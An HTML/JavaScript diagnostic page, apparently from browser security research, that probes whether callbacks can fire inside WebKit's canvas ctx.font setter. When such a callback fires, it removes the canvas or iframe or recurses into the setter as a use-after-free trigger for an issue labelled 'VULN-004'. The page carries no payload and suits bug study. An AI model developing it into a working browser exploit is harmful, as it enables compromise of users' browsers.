<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Canvas setFont Re-entry Timing Diagnostic</title>
<style>
html {
  background: #0d0d0d;
  color: #c9d1d9;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
}
body {
  padding: 16px;
  font-size: 13px;
}
h2 {
  color: #58a6ff;
  margin-bottom: 6px;
}
.sub {
  color: #8b949e;
  margin-bottom: 12px;
}
.box {
  background: #161b22;
  border: 1px solid #30363d;
  border-radius: 8px;
  padding: 12px;
  margin: 10px 0;
}
#stage {
  font-weight: bold;
  font-size: 18px;
  color: #d29922;
}
#log, #previous {
  white-space: pre-wrap;
  word-break: break-word;
  min-height: 160px;
  max-height: 520px;
  overflow-y: auto;
}
.ok { color: #3fb950; }
.bad { color: #f85149; }
.warn { color: #d29922; }
.info { color: #58a6ff; }
.hit {
  color: #ff7b72;
  font-weight: bold;
}
button {
  background: #21262d;
  color: #c9d1d9;
  border: 1px solid #30363d;
  border-radius: 6px;
  padding: 10px 18px;
  font-family: inherit;
  font-size: 13px;
}
button:disabled {
  opacity: .45;
}
canvas {
  border: 1px solid #30363d;
  margin-top: 8px;
}
</style>
</head>
<body>

<h2>Canvas setFont Re-entry Timing Diagnostic</h2>
<div class="sub">
Diagnostic-only. Goal: determine whether JS callbacks fire inside <code>ctx.font</code> / WebKit <code>setFont()</code>, or only before/after it.
</div>

<div class="box">
  <div id="stage">Stage: idle</div>
  <button id="btn">▶ Run diagnostic</button>
</div>

<div class="box">
  <b>Current log</b>
  <pre id="log"></pre>
</div>

<div class="box">
  <b>Previous persisted log</b>
  <pre id="previous"></pre>
</div>

<script>
"use strict";

const STORAGE_KEY = "canvas-setfont-reentry-timing-log";
const LAST_KEY = STORAGE_KEY + "-last";

const stageEl = document.getElementById("stage");
const logEl = document.getElementById("log");
const previousEl = document.getElementById("previous");
const btn = document.getElementById("btn");

let seq = 0;
let inSetFont = false;
let currentProbe = "";
let insideCallbackCount = 0;
let beforeCallbackCount = 0;
let afterCallbackCount = 0;
let crashedOrStopped = false;

function now() {
  return performance.now().toFixed(1).padStart(8);
}

function persist(line) {
  try {
    const old = localStorage.getItem(STORAGE_KEY) || "";
    localStorage.setItem(STORAGE_KEY, old + line + "\n");
    localStorage.setItem(LAST_KEY, line);
  } catch (e) {}
}

function hardMark(msg) {
  try {
    localStorage.setItem(LAST_KEY, "[" + Date.now() + "] " + msg);
  } catch (e) {}
}

function log(msg, cls) {
  const line = "[" + (++seq) + "] [" + now() + "ms] " + msg;
  const d = document.createElement("div");
  d.textContent = line;
  if (cls)
    d.className = cls;
  logEl.appendChild(d);
  logEl.scrollTop = logEl.scrollHeight;
  persist(line);
  try { console.log(line); } catch (e) {}
}

function stage(msg) {
  stageEl.textContent = "Stage: " + msg;
  log("STAGE => " + msg, "info");
}

function sep() {
  log("------------------------------------------------------------", "info");
}

function loadPrevious() {
  try {
    previousEl.textContent =
      "LAST CHECKPOINT:\n" +
      (localStorage.getItem(LAST_KEY) || "") +
      "\n\nFULL LOG:\n" +
      (localStorage.getItem(STORAGE_KEY) || "");
  } catch (e) {
    previousEl.textContent = "localStorage unavailable: " + e.name + ": " + e.message;
  }
}

window.onerror = function(message, source, lineno, colno, error) {
  hardMark("window.onerror");
  log("window.onerror: " + message + " at " + lineno + ":" + colno, "bad");
  if (error && error.stack)
    log("stack: " + error.stack, "bad");
};

window.onunhandledrejection = function(event) {
  hardMark("unhandledrejection");
  log("unhandledrejection: " + event.reason, "bad");
};

window.addEventListener("beforeunload", function() {
  hardMark("beforeunload fired");
});

function makeCanvas(label) {
  const canvas = document.createElement("canvas");
  canvas.width = 120;
  canvas.height = 60;
  canvas.setAttribute("data-probe", label);
  document.body.appendChild(canvas);

  const ctx = canvas.getContext("2d");
  if (!ctx)
    throw new Error("2D context unavailable");

  return { canvas, ctx };
}

function callbackTiming(label) {
  let timing;
  if (inSetFont) {
    timing = "INSIDE ctx.font";
    insideCallbackCount++;
  } else if (currentProbe) {
    timing = "OUTSIDE ctx.font while probe active";
    beforeCallbackCount++;
  } else {
    timing = "OUTSIDE probe";
    afterCallbackCount++;
  }

  log("CALLBACK: " + label + " timing=" + timing + " currentProbe=" + currentProbe, inSetFont ? "hit" : "warn");

  return inSetFont;
}

function setFontWithSentinel(label, ctx, fontValue) {
  log(label + ": ABOUT TO assign ctx.font = " + JSON.stringify(fontValue), "warn");

  currentProbe = label;
  inSetFont = true;
  hardMark(label + ": before ctx.font assignment");

  try {
    ctx.font = fontValue;
    hardMark(label + ": after ctx.font assignment");
    log(label + ": ctx.font assignment returned; ctx.font=" + JSON.stringify(ctx.font), "ok");
  } catch (e) {
    hardMark(label + ": ctx.font threw");
    log(label + ": EXCEPTION from ctx.font: " + e.name + ": " + e.message, "hit");
  } finally {
    inSetFont = false;
    currentProbe = "";
  }
}

async function smallDelay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/*
 * Probe 1:
 * Reproduce the previous customElements pattern, but classify exact timing.
 * If connectedCallback fires before ctx.font, it is NOT evidence of setFont re-entry.
 */
async function probeCustomElementParent() {
  sep();
  stage("Probe 1: parent custom element timing");

  const { canvas, ctx } = makeCanvas("probe1");
  const tag = "x-canvas-timing-parent-" + Date.now();

  const trigger = document.createElement(tag);
  document.body.appendChild(trigger);
  log("[P1] inserted unresolved custom element before define()", "info");

  customElements.define(tag, class extends HTMLElement {
    connectedCallback() {
      const inside = callbackTiming("[P1] connectedCallback");
      if (inside) {
        log("[P1] INSIDE ctx.font: removing canvas", "hit");
        try { canvas.remove(); } catch (e) {}
      }
    }
  });

  log("[P1] customElements.define() returned", "info");

  setFontWithSentinel("[P1]", ctx, "18px sans-serif");

  try { trigger.remove(); } catch (e) {}
  try { canvas.remove(); } catch (e) {}

  await smallDelay(50);
}

/*
 * Probe 2:
 * Try iframe-local custom element registry.
 * This avoids the earlier ambiguity where parent registry and iframe document differ.
 */
async function probeIframeCustomElement() {
  sep();
  stage("Probe 2: iframe custom element timing");

  const iframe = document.createElement("iframe");
  iframe.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px";
  document.body.appendChild(iframe);

  iframe.srcdoc = "<!doctype html><html><body><canvas id='c' width='120' height='60'></canvas></body></html>";

  await new Promise(resolve => {
    iframe.onload = resolve;
  });

  const iwin = iframe.contentWindow;
  const idoc = iframe.contentDocument;
  const canvas = idoc.getElementById("c");
  const ctx = canvas.getContext("2d");

  if (!ctx) {
    log("[P2] iframe ctx unavailable", "bad");
    try { iframe.remove(); } catch (e) {}
    return;
  }

  const tag = "x-canvas-timing-iframe-" + Date.now();
  const trigger = idoc.createElement(tag);
  idoc.body.appendChild(trigger);
  log("[P2] inserted unresolved custom element inside iframe", "info");

  iwin.customElements.define(tag, class extends iwin.HTMLElement {
    connectedCallback() {
      const inside = callbackTiming("[P2] iframe connectedCallback");
      if (inside) {
        log("[P2] INSIDE ctx.font: removing iframe", "hit");
        try { iframe.remove(); } catch (e) {}
      }
    }
  });

  log("[P2] iframe customElements.define() returned", "info");

  setFontWithSentinel("[P2]", ctx, "18px serif");

  try { iframe.remove(); } catch (e) {}

  await smallDelay(50);
}

/*
 * Probe 3:
 * MutationObserver timing around ctx.font.
 * This should normally be async, but the result is useful.
 */
async function probeMutationObserver() {
  sep();
  stage("Probe 3: MutationObserver timing");

  const { canvas, ctx } = makeCanvas("probe3");

  let observerHit = false;
  const mo = new MutationObserver(() => {
    observerHit = true;
    const inside = callbackTiming("[P3] MutationObserver");
    if (inside) {
      log("[P3] INSIDE ctx.font: removing canvas", "hit");
      try { canvas.remove(); } catch (e) {}
    }
  });

  mo.observe(document.body, { childList: true, subtree: true });

  const marker = document.createElement("div");
  marker.textContent = "mutation marker";
  document.body.appendChild(marker);
  log("[P3] DOM mutation queued before ctx.font", "info");

  setFontWithSentinel("[P3]", ctx, "20px monospace");

  await smallDelay(50);

  log("[P3] MutationObserver hit=" + observerHit, observerHit ? "warn" : "ok");

  mo.disconnect();
  try { marker.remove(); } catch (e) {}
  try { canvas.remove(); } catch (e) {}
}

/*
 * Probe 4:
 * Font loading callbacks timing.
 * This tells us whether font events/promises can fire inside ctx.font.
 */
async function probeFontCallbacks() {
  sep();
  stage("Probe 4: document.fonts callback timing");

  const { canvas, ctx } = makeCanvas("probe4");

  const family = "CanvasTimingFont" + Date.now();
  const style = document.createElement("style");
  style.textContent =
    "@font-face {" +
    " font-family: '" + family + "';" +
    " src: local('Arial'), local('Helvetica'), local('Times New Roman'), local('Courier New');" +
    " font-display: block;" +
    "}";

  document.head.appendChild(style);

  let loadingDoneHit = false;
  let readyHit = false;

  if (document.fonts) {
    document.fonts.onloadingdone = function() {
      loadingDoneHit = true;
      callbackTiming("[P4] document.fonts.onloadingdone");
    };

    document.fonts.ready.then(function() {
      readyHit = true;
      callbackTiming("[P4] document.fonts.ready.then");
    }, function(error) {
      log("[P4] fonts.ready rejected: " + error, "bad");
    });
  } else {
    log("[P4] document.fonts unavailable", "warn");
  }

  setFontWithSentinel("[P4]", ctx, "24px " + family);

  await smallDelay(250);

  log("[P4] onloadingdone hit=" + loadingDoneHit + ", fonts.ready hit=" + readyHit, "info");

  try { style.remove(); } catch (e) {}
  try { canvas.remove(); } catch (e) {}
}

/*
 * Probe 5:
 * Detach canvas before ctx.font, then call ctx.font.
 * This checks whether a detached but JS-referenced context remains stable.
 */
async function probeDetachedContext() {
  sep();
  stage("Probe 5: detached canvas context stability");

  const { canvas, ctx } = makeCanvas("probe5");

  canvas.remove();
  log("[P5] canvas removed before ctx.font; JS ctx reference still alive", "warn");

  setFontWithSentinel("[P5]", ctx, "18px Georgia");

  try {
    const w = ctx.measureText("PS5").width;
    log("[P5] measureText after detach width=" + w, isFinite(w) && w > 0 ? "ok" : "hit");
  } catch (e) {
    log("[P5] measureText after detach threw: " + e.name + ": " + e.message, "hit");
  }

  await smallDelay(50);
}

/*
 * Probe 6:
 * Recursive ctx.font only if a callback actually occurs inside setter.
 * Since most callbacks are expected outside setter, this should stay quiet.
 */
async function probeGuardedRecursive() {
  sep();
  stage("Probe 6: guarded recursive setFont");

  const { canvas, ctx } = makeCanvas("probe6");
  const tag = "x-canvas-recursive-" + Date.now();
  let depth = 0;

  const trigger = document.createElement(tag);
  document.body.appendChild(trigger);

  customElements.define(tag, class extends HTMLElement {
    connectedCallback() {
      const inside = callbackTiming("[P6] connectedCallback");
      if (inside && depth < 2) {
        depth++;
        log("[P6] INSIDE ctx.font: recursive ctx.font depth=" + depth, "hit");
        try {
          ctx.font = (12 + depth) + "px monospace";
          log("[P6] recursive ctx.font returned depth=" + depth, "warn");
        } catch (e) {
          log("[P6] recursive ctx.font threw: " + e.name + ": " + e.message, "hit");
        }
        depth--;
      }
    }
  });

  setFontWithSentinel("[P6]", ctx, "16px Arial");

  try { trigger.remove(); } catch (e) {}
  try { canvas.remove(); } catch (e) {}

  await smallDelay(50);
}

async function runAll() {
  btn.disabled = true;
  seq = 0;
  insideCallbackCount = 0;
  beforeCallbackCount = 0;
  afterCallbackCount = 0;
  crashedOrStopped = false;

  try {
    localStorage.removeItem(STORAGE_KEY);
  } catch (e) {}

  logEl.textContent = "";
  loadPrevious();

  stage("started");
  log("POC STARTED: Canvas setFont re-entry timing diagnostic", "info");
  log("Important: only callbacks with timing=INSIDE ctx.font are relevant.", "warn");

  await probeCustomElementParent();
  await probeIframeCustomElement();
  await probeMutationObserver();
  await probeFontCallbacks();
  await probeDetachedContext();
  await probeGuardedRecursive();

  sep();
  stage("summary");

  log("SUMMARY: insideCallbackCount=" + insideCallbackCount, insideCallbackCount ? "hit" : "ok");
  log("SUMMARY: outsideCallbackCount=" + (beforeCallbackCount + afterCallbackCount), "info");

  if (insideCallbackCount > 0) {
    log("RESULT: INTERESTING — at least one callback fired while ctx.font assignment was in progress.", "hit");
    log("NEXT: run this exact file under ASan WebKitTestRunner/MiniBrowser.", "warn");
  } else {
    log("RESULT: NO SYNCHRONOUS JS RE-ENTRY OBSERVED INSIDE ctx.font.", "ok");
    log("INTERPRETATION: current VULN-004 UAF path is weak on this platform.", "ok");
  }

  log("NO CRASH OBSERVED", "ok");
  log("DONE", "ok");

  btn.disabled = false;
}

btn.addEventListener("click", function() {
  runAll().catch(function(e) {
    log("TOP LEVEL ERROR: " + e.name + ": " + e.message, "hit");
    btn.disabled = false;
  });
});

loadPrevious();
hardMark("page loaded");
</script>
</body>
</html>
